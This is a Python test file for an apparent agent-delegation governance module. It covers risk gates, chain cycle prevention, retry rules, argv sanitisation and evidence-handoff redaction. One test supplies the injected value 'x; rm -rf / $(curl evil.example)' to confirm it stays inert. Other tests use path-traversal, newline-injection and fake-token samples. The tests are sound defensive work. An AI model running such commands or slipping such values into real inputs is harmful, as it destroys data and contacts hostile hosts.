"""lf-0028: delegation governance — risk gates, chain admission, argv hygiene,
retry policy and evidence-handoff hygiene (PHASE 14)."""

from __future__ import annotations

import dataclasses

import pytest

from theforge import delegation_governance as gov
from theforge.contracts import (
    ContractError,
    DeclaredCapability,
    EvidenceHandoff,
    SpecialistDelegation,
    from_dict,
    to_dict,
)
from theforge.contracts.evidence_handoff import MAX_HANDOFF_FINDINGS

_SENTINEL_CAPS = [
    {"id": "sentinel.log-analyze", "risk": "read_only", "external_cost": "none"},
]


def _delegation(**over) -> SpecialistDelegation:
    doc = {
        "consumer": "data-sentinel",
        "specialists": [
            {"provider": "spark-forge-aws", "intents": ["runtime-failure"]},
            {"provider": "forge-doctor-data", "intents": ["static-analysis"]},
        ],
    }
    doc.update(over)
    return from_dict(SpecialistDelegation, doc)


def _handoff(**over) -> EvidenceHandoff:
    doc = {
        "run_id": "run-1",
        "correlation_id": "corr-1",
        "idempotency_key": "idem-1",
        "source_provider": "data-sentinel",
        "consumer_provider": "spark-forge-aws",
        "capability": "sentinel.log-analyze",
        "status": "completed",
        "created_at": "2026-10-21T00:00:00Z",
        "findings": [
            {
                "id": "f1",
                "severity": "high",
                "confidence": "POSSIBLE",
                "summary": "suspected skew",
                "evidence_refs": ["log:1"],
            }
        ],
    }
    doc.update(over)
    return from_dict(EvidenceHandoff, doc)


def _cap(risk="read_only", cost="none", **kw) -> DeclaredCapability:
    return DeclaredCapability(id="cap.test", risk=risk, external_cost=cost, **kw)


# --- risk mapping + policy gate ------------------------------------------------


def test_capability_risks_maps_operation_class_positionally():
    assert gov.capability_risks(_cap("read_only")) == frozenset({"LOCAL_READ"})
    assert gov.capability_risks(_cap("local_mutation")) == frozenset({"LOCAL_WRITE"})
    assert gov.capability_risks(_cap("external_read")) == frozenset({"EXTERNAL_READ"})
    assert gov.capability_risks(_cap("external_mutation")) == frozenset({"EXTERNAL_WRITE"})
    assert gov.capability_risks(_cap("destructive")) == frozenset({"DESTRUCTIVE"})


def test_undeclared_cost_is_cost_bearing():
    """external_cost=unknown is the honest default — it cannot imply 'free'."""
    assert gov.capability_risks(_cap("read_only", "unknown")) == frozenset(
        {"LOCAL_READ", "COST_BEARING"}
    )
    for cost in ("possible", "metered"):
        assert "COST_BEARING" in gov.capability_risks(_cap("read_only", cost))
    assert "COST_BEARING" not in gov.capability_risks(_cap("read_only", "none"))


def test_policy_gate_allows_local_read_by_policy():
    decision = gov.gate_capability(frozenset({"LOCAL_READ"}))
    assert decision.decision == "allow"


def test_policy_gate_denies_everything_beyond_local_read_without_authorization():
    for level in ("LOCAL_WRITE", "EXTERNAL_READ", "EXTERNAL_WRITE", "DESTRUCTIVE", "COST_BEARING"):
        decision = gov.gate_capability(frozenset({level}))
        assert decision.decision == "deny", level
        assert level in decision.missing


def test_policy_gate_honors_explicit_authorization_per_level():
    denied = gov.gate_capability(frozenset({"EXTERNAL_READ", "COST_BEARING"}))
    assert denied.decision == "deny"
    partial = gov.gate_capability(
        frozenset({"EXTERNAL_READ", "COST_BEARING"}), authorized={"EXTERNAL_READ"}
    )
    assert partial.decision == "deny" and partial.missing == ("COST_BEARING",)
    allowed = gov.gate_capability(
        frozenset({"EXTERNAL_READ", "COST_BEARING"}),
        authorized={"EXTERNAL_READ", "COST_BEARING"},
    )
    assert allowed.decision == "allow"


def test_gate_denial_is_deterministic_and_ordered():
    a = gov.gate_capability(frozenset({"DESTRUCTIVE", "EXTERNAL_WRITE", "LOCAL_READ"}))
    b = gov.gate_capability(frozenset({"EXTERNAL_WRITE", "LOCAL_READ", "DESTRUCTIVE"}))
    assert a == b and a.missing == ("EXTERNAL_WRITE", "DESTRUCTIVE")


# --- retry policy ---------------------------------------------------------------


def test_retries_only_for_local_read_transient_failures():
    assert gov.may_retry("timeout", {"LOCAL_READ"}, attempt=0)
    assert gov.may_retry("runtime-error", {"LOCAL_READ"}, attempt=0)
    assert not gov.may_retry("timeout", {"LOCAL_READ"}, attempt=1, max_retries=1)
    assert not gov.may_retry("timeout", {"EXTERNAL_READ"}, attempt=0)
    for code in (
        "policy-refusal",
        "permission-denied",
        "invalid-input",
        "invalid-output",
        "provider-absent",
        "version-incompatible",
        "capability-absent",
        "insufficient-evidence",
        "cycle-detected",
        "budget-exhausted",
        "cancelled",
    ):
        assert not gov.may_retry(code, {"LOCAL_READ"}, attempt=0), code


# --- chain admission: cycle prevention -------------------------------------------


def test_start_chain_mints_consumer_as_origin():
    chained = gov.start_chain(_delegation(), correlation_id="c-1")
    assert chained.chain is not None
    assert chained.chain.correlation_id == "c-1"
    assert chained.chain.visited_providers == ["data-sentinel"]
    assert chained.chain.delegation_depth == 0


def test_sentinel_spark_sentinel_cycle_is_refused():
    """The spec's loop case: origin can never be re-entered."""
    chained = gov.start_chain(_delegation(), correlation_id="c-1")
    to_spark = gov.admit_hop(chained, "spark-forge-aws")
    assert isinstance(to_spark, SpecialistDelegation)
    assert to_spark.chain is not None and to_spark.chain.delegation_depth == 1

    # Spark's own declaration adopts the incoming chain intact.
    spark_doc = dataclasses.replace(
        _delegation(consumer="spark-forge-aws", specialists=[{"provider": "data-sentinel"}]),
        chain=to_spark.chain,
    )
    back = gov.admit_hop(spark_doc, "data-sentinel")
    assert isinstance(back, gov.DelegationRefusal)
    assert back.code == "cycle-detected"


def test_reentering_the_consumer_is_refused():
    chained = gov.start_chain(_delegation(), correlation_id="c-1")
    back = gov.admit_hop(chained, "data-sentinel")
    assert isinstance(back, gov.DelegationRefusal) and back.code == "cycle-detected"


def test_undeclared_provider_refused_before_chain_grows():
    chained = gov.start_chain(_delegation(), correlation_id="c-1")
    refusal = gov.admit_hop(chained, "rogue-forge")
    assert isinstance(refusal, gov.DelegationRefusal) and refusal.code == "provider-absent"


def test_hop_budget_exhaustion_is_a_named_refusal():
    chained = gov.start_chain(_delegation(), correlation_id="c-1", max_hops=1)
    first = gov.admit_hop(chained, "spark-forge-aws")
    assert isinstance(first, SpecialistDelegation)
    second = gov.admit_hop(first, "forge-doctor-data")
    assert isinstance(second, gov.DelegationRefusal) and second.code == "budget-exhausted"


def test_timeout_budget_counts_elapsed_seconds():
    chained = gov.start_chain(_delegation(), correlation_id="c-1", timeout_budget_s=120)
    spent = gov.admit_hop(chained, "spark-forge-aws", elapsed_s=130)
    assert isinstance(spent, gov.DelegationRefusal) and spent.code == "budget-exhausted"
    ok = gov.admit_hop(chained, "spark-forge-aws", elapsed_s=30)
    assert isinstance(ok, SpecialistDelegation)
    assert ok.chain is not None and ok.chain.timeout_budget_s == 90


def test_cancelled_chain_refuses_further_hops():
    chained = gov.start_chain(_delegation(), correlation_id="c-1", cancellation_token="tok-1")
    cancelled = dataclasses.replace(
        chained, chain=dataclasses.replace(chained.chain, cancelled=True)
    )
    refusal = gov.admit_hop(cancelled, "spark-forge-aws")
    assert isinstance(refusal, gov.DelegationRefusal) and refusal.code == "cancelled"


def test_admission_requires_a_minted_chain():
    refusal = gov.admit_hop(_delegation(), "spark-forge-aws")
    assert isinstance(refusal, gov.DelegationRefusal) and refusal.code == "invalid-input"


# --- argv hygiene -----------------------------------------------------------------


def test_resolve_capability_argv_replaces_known_placeholders():
    argv = gov.resolve_capability_argv(
        ["{cli}", "analyze", "{target}"],
        cli_argv=["/usr/bin/sentinel"],
        target="logs/run-1.log",
    )
    assert argv == ["/usr/bin/sentinel", "analyze", "logs/run-1.log"]


def test_injection_attempt_stays_a_single_inert_argument():
    """No shell ever sees the argv, so `;` and `$(...)` are data. The
    protection is that a substitution is always exactly one element."""
    argv = gov.resolve_capability_argv(
        ["{cli}", "analyze", "{target}"],
        cli_argv=["sentinel"],
        target="x; rm -rf / $(curl evil.example)",
    )
    assert isinstance(argv, list)
    assert argv == ["sentinel", "analyze", "x; rm -rf / $(curl evil.example)"]


def test_injection_via_control_characters_is_refused():
    refusal = gov.resolve_capability_argv(
        ["{cli}", "analyze", "{target}"],
        cli_argv=["sentinel"],
        target="ok\nmalicious-second-line",
    )
    assert isinstance(refusal, gov.DelegationRefusal) and refusal.code == "invalid-input"


def test_traversal_in_substitutions_is_refused():
    for bad in ("../outside", "a/../../b"):
        refusal = gov.resolve_capability_argv(
            ["{cli}", "analyze", "{target}"], cli_argv=["sentinel"], target=bad
        )
        assert isinstance(refusal, gov.DelegationRefusal)
        assert refusal.code == "invalid-input"


def test_unknown_placeholder_is_a_named_refusal():
    refusal = gov.resolve_capability_argv(["{cli}", "{evil}"], cli_argv=["sentinel"])
    assert isinstance(refusal, gov.DelegationRefusal) and refusal.code == "invalid-input"


def test_missing_substitution_values_refuse_not_guess():
    refusal = gov.resolve_capability_argv(["{cli}", "x"], cli_argv=None)
    assert isinstance(refusal, gov.DelegationRefusal) and refusal.code == "invalid-input"


def test_argv_problems_flags_control_and_empty():
    assert gov.argv_problems([]) == ["empty argv"]
    assert gov.argv_problems(["a", ""]) != []
    assert gov.argv_problems(["a\x00b"]) != []
    assert gov.argv_problems(["sentinel", "analyze", "logs/x"]) == []


# --- evidence handoff hygiene ------------------------------------------------------


def test_seal_and_verify_integrity():
    handoff = gov.seal_handoff(_handoff())
    assert handoff.integrity is not None and gov.verify_integrity(handoff)
    tampered = dataclasses.replace(handoff, status="partial")
    assert not gov.verify_integrity(tampered)
    assert not gov.verify_integrity(_handoff())  # unsealed is unverifiable


def test_idempotency_key_is_deterministic():
    a = gov.idempotency_key("data-sentinel", "sentinel.log-analyze", "run-1", "fp-x")
    b = gov.idempotency_key("data-sentinel", "sentinel.log-analyze", "run-1", "fp-x")
    c = gov.idempotency_key("data-sentinel", "sentinel.log-analyze", "run-2", "fp-x")
    assert a == b and a != c and a.startswith("idem-")


def test_bound_handoff_truncates_oversized_findings_with_flag():
    doc = to_dict(_handoff())
    doc["findings"] = [
        {
            "id": f"f{i:03d}",
            "severity": "info" if i else "critical",
            "confidence": "POSSIBLE",
            "summary": "x" * 3000,
            "evidence_refs": ["e:1"],
        }
        for i in range(200)
    ]
    bounded = gov.bound_handoff(doc)
    assert bounded.truncated is True and bounded.dropped > 0
    assert len(bounded.findings) <= MAX_HANDOFF_FINDINGS
    # most-severe findings survive truncation
    assert bounded.findings[0].severity == "critical"


def test_bound_handoff_preserves_refusal_state():
    doc = to_dict(_handoff(status="refused", error={"code": "policy-refusal", "detail": "denied"}))
    doc["limitations"] = [f"l{i}" for i in range(200)]
    bounded = gov.bound_handoff(doc)
    assert bounded.status == "refused"
    assert bounded.error is not None and bounded.error.code == "policy-refusal"
    assert bounded.truncated and bounded.dropped == 200 - 64


def test_bound_handoff_never_repairs_invalid_data():
    doc = to_dict(_handoff())
    doc["status"] = "failed"  # failed without an error object is invalid
    with pytest.raises(ContractError):
        gov.bound_handoff(doc)


def test_redact_handoff_scrubs_free_text_and_marks_itself():
    handoff = _handoff()
    with_secret = dataclasses.replace(
        handoff,
        limitations=["used token=ghp_" + "a" * 36 + " for auth"],
    )
    redacted = gov.redact_handoff(with_secret)
    assert redacted.redacted is True
    assert "ghp_" not in redacted.limitations[0]
    assert "[REDACTED]" in redacted.limitations[0]
    assert redacted.integrity is None  # caller re-seals


def test_refusal_preservation_through_serialize_redact_and_bound():
    handoff = _handoff(status="refused", error={"code": "policy-refusal", "detail": "no auth"})
    roundtripped = from_dict(EvidenceHandoff, to_dict(gov.redact_handoff(handoff)))
    bounded = gov.bound_handoff(to_dict(handoff))
    for kept in (roundtripped, bounded):
        assert kept.status == "refused"
        assert kept.error is not None and kept.error.code == "policy-refusal"
